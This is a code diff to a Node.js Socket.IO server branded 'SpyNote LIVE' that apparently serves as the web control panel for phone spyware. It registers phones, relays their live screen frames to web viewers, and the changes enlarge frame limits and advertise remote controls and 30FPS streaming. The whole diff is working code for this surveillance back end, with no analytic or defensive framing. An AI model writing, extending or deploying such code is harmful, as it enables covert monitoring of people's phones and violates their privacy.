@@ -10,12 +10,12 @@ const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
     pingTimeout: 60000,
     pingInterval: 25000,
-    maxHttpBufferSize: 50e6 // 🔥 Large frames
+    maxHttpBufferSize: 100e6 // 🔥 Large JPEG frames
 });
 
 app.use(compression());
 app.use(express.static('public'));
-app.use(express.json({ limit: '50mb' }));
+app.use(express.json({ limit: '100mb' }));
 
 const devices = new Map();
 
@@ -26,6 +26,7 @@ app.get('/devices', (req, res) => {
 io.on('connection', (socket) => {
     console.log('🔌 Connection:', socket.id);
 
+    // 🔥 DEVICE REGISTRATION
     socket.on('register-device', (deviceInfo) => {
         const deviceId = deviceInfo.deviceId;
         if (deviceId) {
@@ -36,20 +37,20 @@ io.on('connection', (socket) => {
                 lastSeen: Date.now()
             });
             socket.join(deviceId);
-            console.log('📱 Device LIVE:', deviceId);
+            console.log('📱 Device LIVE:', deviceId, deviceInfo.model);
             io.emit('devices-update', Array.from(devices.entries()));
         }
     });
 
-    // 🔥 LIVE SCREEN RELAY (phone → web)
+    // 🔥 LIVE SCREEN RELAY (phone → ALL web clients watching device)
     socket.on('screen-frame', (data) => {
         const deviceId = data.deviceId;
         if (devices.has(deviceId)) {
-            // Update last seen
+            // Update activity
             const device = devices.get(deviceId);
             devices.set(deviceId, { ...device, lastSeen: Date.now() });
             
-            // Relay to web clients
+            // 🔥 FAST RELAY TO ALL WATCHING CLIENTS
             socket.to(deviceId).emit('screen-update', data);
         }
     });
@@ -64,6 +65,7 @@ io.on('connection', (socket) => {
     });
 
     socket.on('disconnect', () => {
+        // Mark device offline
         for (const [deviceId, info] of devices.entries()) {
             if (info.socketId === socket.id) {
                 devices.set(deviceId, { ...info, connected: false });
@@ -75,19 +77,21 @@ io.on('connection', (socket) => {
     });
 });
 
-// 🔥 Cleanup offline devices
+// 🔥 CLEANUP OFFLINE DEVICES
 setInterval(() => {
     const now = Date.now();
     for (const [deviceId, info] of devices.entries()) {
-        if (!info.connected && (now - info.lastSeen) > 30000) {
+        if (!info.connected && (now - info.lastSeen) > 60000) {
             devices.delete(deviceId);
             io.emit('devices-update', Array.from(devices.entries()));
+            console.log('🧹 Removed stale device:', deviceId);
         }
     }
 }, 30000);
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`🚀 SpyNote LIVE on http://localhost:${PORT}`);
-    console.log(`📱 Ready for screen mirroring!`);
+    console.log(`🚀 SpyNote LIVE Server: http://localhost:${PORT}`);
+    console.log(`📱 Web panel ready!`);
+    console.log(`🎮 Controls + 30FPS streaming enabled`);
 });
